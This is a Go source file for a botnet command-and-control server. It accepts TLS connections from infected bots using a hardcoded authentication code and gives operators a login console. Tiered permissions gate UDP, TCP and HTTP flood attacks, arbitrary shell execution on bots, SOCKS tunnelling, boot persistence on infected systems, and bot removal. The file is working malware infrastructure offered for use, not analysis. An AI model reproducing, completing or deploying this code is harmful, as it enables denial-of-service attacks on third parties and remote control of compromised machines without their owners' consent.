package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"sync"
	"time"
)

const (
	// File paths
	USERS_FILE = "users.json"

	// Server IPs
	USER_SERVER_IP = "0.0.0.0"
	BOT_SERVER_IP  = "0.0.0.0"

	//run setup.py dont try to change this yourself

	// Server ports
	BOT_SERVER_PORT  = "443" // do not change
	USER_SERVER_PORT = "420"

	// Authentication  these must match bot
	MAGIC_CODE       = "z!RDnjvvXHWDX^sq"
	PROTOCOL_VERSION = "proto59"
)

type BotConnection struct {
	conn          net.Conn
	botID         string
	connectedAt   time.Time
	lastPing      time.Time
	authenticated bool
	arch          string
	ip            string
	ram           int64    // RAM in MB
	cpuCores      int      // CPU cores
	userConn      net.Conn // Track which user is controlling this bot
}

type client struct {
	conn           net.Conn
	user           User
	lastBotCommand time.Time
}

type attack struct {
	method   string
	ip       string
	port     string
	duration time.Duration
	start    time.Time
}

type Credential struct {
	Username string `json:"Username"`
	Password string `json:"Password"`
	Expire   string `json:"Expire"`
	Level    string `json:"Level"`
}

var (
	ongoingAttacks = make(map[net.Conn]attack)
	botConnections = make(map[string]*BotConnection)
	botConnsLock   sync.RWMutex
	botCount       int
	botConns       []net.Conn
	commandOrigin  = make(map[string]net.Conn) // botID -> user connection that sent command
	originLock     sync.RWMutex
	tuiMode        bool      // Global flag for TUI mode
	c2StartTime    time.Time // When the C2 server was started
)

// logMsg prints a message only if not in TUI mode (avoids messing up TUI display)
func logMsg(format string, args ...interface{}) {
	if !tuiMode {
		fmt.Printf(format+"\n", args...)
	}
}

type bot struct {
	arch string
	conn net.Conn
}

var (
	bots       = []bot{}
	clients    = []*client{}
	maxAttacks = 20
)

// ============================================================================
// PERMISSION CHECKING FUNCTIONS
// Role-based access control for CNC commands. Each function checks if the
// authenticated user has sufficient privileges for specific command categories.
// Permission levels from lowest to highest: Basic < Pro < Admin < Owner
// ============================================================================

// canUseDDoS checks if user can execute attack commands (UDP, TCP, HTTP floods)
// Minimum required level: Basic (all authenticated users can use DDoS)
// This is the most permissive check - anyone with valid login can attack
func (c *client) canUseDDoS() bool {
	// Basic users can only use DDoS commands
	level := c.user.GetLevel()
	return level == Basic || level == Pro || level == Admin || level == Owner
}

// canUseShell checks if user can execute shell commands on bots (!shell, !exec)
// Minimum required level: Admin (elevated privilege required for code execution)
// Shell access is dangerous - can run arbitrary commands on all bots
// Also gates SOCKS proxy commands which tunnel traffic through bots
func (c *client) canUseShell() bool {
	// Shell commands require Admin or higher due to security risk
	level := c.user.GetLevel()
	return level == Admin || level == Owner
}

// canUseBotManagement checks if user can manage bot lifecycle (reinstall, kill, persist)
// Minimum required level: Admin
// These commands affect bot availability for all users:
// - !reinstall: Forces bot to re-download and reinstall itself
// - !lolnogtfo: Kills and removes bot (destructive action)
// - !persist: Sets up boot persistence on infected systems
func (c *client) canUseBotManagement() bool {
	// Bot management requires Admin or Owner level privileges
	level := c.user.GetLevel()
	return level == Admin || level == Owner
}

// canUsePrivate checks if user can access owner-only features
// Minimum required level: Owner (highest privilege level)
// Private commands include:
// - Database access (view all user credentials)
// - System configuration commands
// - Any future sensitive operations
func (c *client) canUsePrivate() bool {
	// Private commands require Owner only - no delegation
	level := c.user.GetLevel()
	return level == Owner
}

// canTargetSpecificBot checks if user can send commands to individual bots
// Minimum required level: Pro
// By default, commands go to ALL bots. This permission allows:
// - Targeting specific bot by ID: !abc123 <command>

func (c *client) canTargetSpecificBot() bool {
	// Targeting specific bots requires Pro or higher level
	level := c.user.GetLevel()
	return level == Pro || level == Admin || level == Owner
}

// ============================================================================
// HELP MENU SYSTEM
// Dynamically generates help menus based on user's permission level.
// Only shows commands the user is authorized to execute.
// Uses ANSI escape codes for colored terminal output.
// ============================================================================

func (c *client) showHelpMenu(conn net.Conn) {
	c.writeHeader(conn) // Top border with user level

	// All authenticated users see general commands
	if c.canUseDDoS() {
		c.writeGeneralCommands(conn)
	}

	// Admin+ sees shell commands
	if c.canUseShell() {
		c.writeShellCommands(conn)
	}

	// Pro+ sees bot targeting
	if c.canTargetSpecificBot() {
		c.writeBotTargeting(conn)
	}

	// Admin+ sees bot management
	if c.canUseBotManagement() {
		c.writeBotManagement(conn)
	}

	// Owner only sees private commands
	if c.canUsePrivate() {
		c.writePrivateCommands(conn)
	}

	c.writeFooter(conn) // Bottom border
}

// ============================================================================
// MAIN ENTRY POINT
// Initializes the CNC server with two listeners:
// 1. TLS bot listener on port 443 - accepts encrypted bot connections
// 2. Plain TCP user listener on configured port - accepts admin CLI logins
// Creates default root user if users.json doesn't exist.
// ============================================================================

// main is the CNC server entry point - starts both bot and user servers
// Creates root user with random password on first run
// Loads TLS certificates for secure bot communication
// Starts background goroutines for dead bot cleanup
// Bot server runs TLS on 443, user CLI runs plain TCP
func main() {
	// Record C2 start time for uptime tracking
	c2StartTime = time.Now()

	// Check for split mode flag (TUI is default, --split enables telnet)
	splitMode := len(os.Args) > 1 && os.Args[1] == "--split"
	tuiMode = !splitMode

	// First run: Create default root user with random 12-char password
	if _, fileError := os.ReadFile("users.json"); fileError != nil {
		password, err := randomString(12)
		if err != nil {
			fmt.Println("Error generating password:", err)
			return
		}

		rootUser := User{
			Username: "root",
			Password: password,
			Expire:   time.Now().AddDate(111, 111, 111),
			Level:    "Owner",
		}

		bytes, err := json.Marshal([]User{rootUser})
		if err != nil {
			fmt.Println("Error marshalling user data:", err)
			return
		}

		if err := os.WriteFile("users.json", bytes, 0777); err != nil {
			fmt.Println("Error writing to users.json:", err)
			return
		}
		fmt.Println("[☾℣☽] Login with username", rootUser.Username, "and password", rootUser.Password)
	}

	// Load TLS configuration
	logMsg("[INFO] Loading TLS certificates...")
	tlsConfig := loadTLSConfig()
	logMsg("[INFO] TLS configuration loaded successfully")

	// Start dead bot cleanup routine
	go cleanupDeadBots()

	// Start bot server (TLS ONLY)
	go func() {
		logMsg("[☾℣☽] Bot TLS server starting on %s:%s", BOT_SERVER_IP, BOT_SERVER_PORT)
		botListener, err := tls.Listen("tcp", BOT_SERVER_IP+":"+BOT_SERVER_PORT, tlsConfig)
		if err != nil {
			fmt.Println("[FATAL] Error starting bot TLS server:", err)
			os.Exit(1)
		}
		defer botListener.Close()

		logMsg("[☾℣☽] Bot TLS server is running on port 443")
		logMsg("[AUTH] Using magic code authentication: %s", MAGIC_CODE)

		for {
			conn, err := botListener.Accept()
			if err != nil {
				logMsg("Error accepting bot TLS connection: %v", err)
				continue
			}

			// Validate TLS and start authentication
			go validateTLSHandshake(conn)
		}
	}()

	// TUI mode: Start local Bubble Tea interface instead of telnet server
	if tuiMode {
		time.Sleep(500 * time.Millisecond) // Let bot server start
		if err := StartTUI(); err != nil {
			fmt.Println("Error running TUI:", err)
			os.Exit(1)
		}
		return
	}

	// Start admin CLI server (plain TCP)
	logMsg("[☾℣☽] Admin CLI server starting on %s:%s", USER_SERVER_IP, USER_SERVER_PORT)
	userListener, err := net.Listen("tcp", USER_SERVER_IP+":"+USER_SERVER_PORT)
	if err != nil {
		fmt.Println("Error starting user server:", err)
		return
	}
	defer userListener.Close()

	go updateTitle()

	// User connection handling
	for {
		conn, err := userListener.Accept()
		if err != nil {
			logMsg("Error accepting user connection: %v", err)
			continue
		}
		logMsg("[☾℣☽] [User] Connected To Login Port: %s", conn.RemoteAddr())

		go handleRequest(conn)
	}
}
